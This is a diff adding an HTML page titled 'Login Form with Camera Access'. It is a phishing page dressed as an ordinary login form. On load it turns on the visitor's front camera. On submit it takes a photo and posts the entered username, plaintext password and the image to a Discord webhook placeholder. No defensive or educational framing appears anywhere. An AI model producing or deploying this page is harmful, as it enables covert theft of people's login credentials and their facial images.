@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form with Camera Access</title>
+</head>
+<body>
+    <h2>Login Form</h2>
+    <form id="loginForm">
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username"><br><br>
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password"><br><br>
+        <button type="submit">Login</button>
+    </form>
+    <video id="video" width="640" height="480" autoplay></video> <!-- Video element for camera stream -->
+
+    <script>
+        // Request camera access and start video stream
+        const video = document.getElementById('video');
+    
+        function startVideo() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }) // 'user' for front camera
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error("Error accessing the camera: ", err);
+                alert('Unable to access camera.');
+            });
+        }
+    
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+    
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height); // Draw video frame to canvas
+    
+            // Convert canvas to data URL
+            const photo = canvas.toDataURL('image/png');
+    
+            // Prepare form data
+            const formData = new FormData(this);
+            const username = formData.get('username');
+            const password = formData.get('password');
+    
+            // Construct the message to send to Discord
+            const message = `New login:\nUsername: ${username}\nPassword: ${password}\nPhoto: ${photo}`;
+    
+            console.log("Sending the following data to Discord: ", message); // Debugging log
+    
+            // Send the message to Discord using a webhook
+            fetch('YOUR_DISCORD_WEBHOOK_URL', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ content: message }),
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Failed to send message to Discord, response status: ' + response.status);
+                }
+                alert('Login information submitted successfully!');
+                // Optionally, redirect the user to another page
+                // window.location.href = 'redirect_page.html';
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert('Failed to submit login information.');
+            });
+        });
+    
+        startVideo(); // Start the video stream when the page loads
+    </script>
+    
+</body>
+</html>
